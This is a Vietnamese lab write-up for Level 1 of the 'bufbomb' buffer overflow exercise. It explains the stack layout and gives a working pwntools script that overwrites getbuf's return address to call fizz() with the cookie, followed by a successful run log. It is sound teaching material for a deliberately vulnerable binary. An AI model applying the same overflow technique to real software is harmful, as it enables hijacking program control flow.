# Level 1
## Task
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
```
```
└─$ ./bufbomb -u 09821978
Userid: 09821978
Cookie: 0x31f21393
Type string:abcdefgh
Dud: getbuf returned 0x1
Better luck next time
```
> Buffer overflow để thực thi được hàm `fizz()`.  

## Solution
Ở level này, cách chúng ta exploit cũng tương tự như ở [level 0](https://github.com/datthinh1801/NT209.L21.ANTN.Group_1/tree/main/Lab%205/Level%200), chỉ có duy nhất 1 điểm khác biệt là hàm `fizz()` có 1 tham số truyền vào.  
```c
void __cdecl __noreturn fizz(int a1)
{
  if ( a1 == cookie )
  {
    printf("Fizz!: You called fizz(0x%x)\n", a1);
    validate(1);
  }
  else
  {
    printf("Misfire: You called fizz(0x%x)\n", a1);
  }
  exit(0);
}
```  

Bên cạnh đó, hàm `fizz()` này sẽ so sánh giá trị được truyền vào với giá `cookie` được tạo từ `username`. Nếu 2 giá trị bằng nhau thì chuỗi `Fizz!: You called fizz(_giá_trị_hexa_của_tham_số_truyền_vào_)` sẽ được in ra console, nếu không thì chuỗi `Misfire!: You called fizz(_giá_trị_hexa_của_tham_số_truyền_vào_)` sẽ được in ra console.  

Vậy bên cạnh việc overflow để thực thi được hàm `fizz()`, chúng ta còn cần phải truyền được giá trị bằng với giá trị `cookie` vào hàm `fizz()` này.  

Tiếp theo, để quyết định được payload để nhập vào chương trình, chúng ta sẽ xem stack trước khi hàm `Gets()` được thực thi.  
```
+---------------------------------+
|     return address (getbuf)     |---> return address của hàm getbuf()
+---------------------------------+
|      ebp (getbuf's caller)      |---> ebp của hàm gọi getbuf()
+---------------------------------+
               .
               . => 0x24 bytes 
               .
+---------------------------------+
|              v1                 |---> top của stack
+---------------------------------+
```  
> Tương tự ở level 0, payload của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x4` với `4` bytes cuối là địa chỉ của hàm `fizz()`.

Stack khi bắt đầu thực thi hàm `fizz()`:  
```
+---------------------------------+
|           argument 1            |
+---------------------------------+
|     return address (fizz)       |---> return address của hàm fizz()
+---------------------------------+
|      ebp (fizz's caller)        |---> đỉnh của stack
+---------------------------------+
```  

Khi hàm `fizz()` được thực thi thì giá trị của tham số thứ nhất sẽ được truy xuất qua tham chiếu `(%ebp + 8)` (như hình minh họa ở trên). Chính vì vậy, để thành công trong việc truyền giá trị vào hàm thì chúng ta cần ghi thêm `8` bytes vào payload với `4` bytes đầu để ghi đè giá trị của return address của hàm `fizz()` và `4` bytes cuối cùng chính là giá trị mà chúng ta muốn truyền vào hàm `fizz()`.

### Script
```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'

# tạo process tới chương trình bufbomb
main_handler = process(['./bufbomb', '-u', '09821978'])

# tạo process tới chương trình makecookie để tạo cookie
cookie_getter = process(['./makecookie', '09821978'])
# lưu giá trị cookie
cookie = cookie_getter.recvline()[2:-1]
cookie = int(cookie, 16)
print(f"cookie: {hex(cookie)}")

# tạo 1 ELF object để đọc metadata của file bufbomb
e = ELF('./bufbomb')

# tạo payload với (0x28 + 0x4) bytes ký tự 'A'
exploit_payload = b'A'*(0x28 + 4)
# lấy địa chỉ của hàm fizz() thêm vào payload
exploit_payload += p32(e.symbols['fizz'])
# tiếp tục chèn thêm 4 ký tự 'A' vào payload
# để ghi đè return address của hàm fizz
exploit_payload += b'A'*4
# chèn giá trị cookie vào payload
exploit_payload += p32(cookie)

print(f"exploit payload: {exploit_payload}")

with open('payload.txt', 'wb') as f:
    f.write(exploit_payload)

main_handler.sendline(exploit_payload)
main_handler.interactive()
```  

Stack khi bị overflow:  
```
+---------------------------------+
|             cookie              |---> tham số thứ nhất của hàm fizz()
+---------------------------------+
|             'AAAA'              |---> return address của hàm fizz()
+---------------------------------+
|      địa chỉ của hàm fizz()     |---> return address của hàm getbuf()
+---------------------------------+
|             'AAAA'              |---> ebp của hàm gọi getbuf()
+---------------------------------+
               .
               . => 0x24 bytes 
               .
+---------------------------------+
|             'AAAA'              |---> top của stack
+---------------------------------+
```  

Chạy script.  
```
└─$ ./level1.py
[*] '/mnt/f/src-team-1/bufbomb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './bufbomb': pid 29
[+] Starting local process './makecookie': pid 31
[*] Process './makecookie' stopped with exit code 0 (pid 31)
cookie: 0x31f21393
exploit payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x9b\x13\x80AAAA\x93\x13\xf21'
[*] Switching to interactive mode
[*] Process './bufbomb' stopped with exit code 0 (pid 29)
Userid: 09821978
Cookie: 0x31f21393
Type string:Fizz!: You called fizz(0x31f21393)
VALID
NICE JOB!
[*] Got EOF while reading in interactive
$
```  
> Thành công!
